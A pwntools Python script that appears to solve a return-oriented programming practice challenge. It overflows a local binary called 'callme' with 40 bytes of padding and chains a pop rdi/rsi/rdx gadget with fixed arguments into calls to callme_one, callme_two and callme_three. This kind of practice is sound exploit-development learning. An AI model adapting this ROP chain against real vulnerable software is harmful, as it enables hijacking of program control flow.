from pwn import *

"""
payload representation:
A*40
pop rdi ; pop rsi ; pop rdx ; ret
deadbeefdeadbeef
cafebabecafebabe
d00df00dd00df00d
call callme_one

pop rdi ; pop rsi ; pop rdx ; ret
deadbeefdeadbeef
cafebabecafebabe
d00df00dd00df00d
call callme_two

pop rdi ; pop rsi ; pop rdx ; ret
deadbeefdeadbeef
cafebabecafebabe
d00df00dd00df00d
call callme_three
"""
binary = context.binary = ELF("./callme", checksec=True)

gadget = p64(0x000000000040093c)

callme_three = p64(0x004006f0) # 0x004006f0
callme_two = p64(0x00400740) # 0x00400740
callme_one = p64(0x00400720) # 0x00400720

dead = p64(0xdeadbeefdeadbeef)
cafe = p64(0xcafebabecafebabe)
dood = p64(0xd00df00dd00df00d)


p = process(binary.path)
payload = b"\x90"*40
payload += gadget+dead+cafe+dood
payload += callme_one

payload += gadget+dead+cafe+dood
payload += callme_two

payload += gadget+dead+cafe+dood
payload += callme_three

with open("payload.txt", "wb") as file:
	file.write(payload)


p.sendline(payload)
print(p.recvall())
p.close()
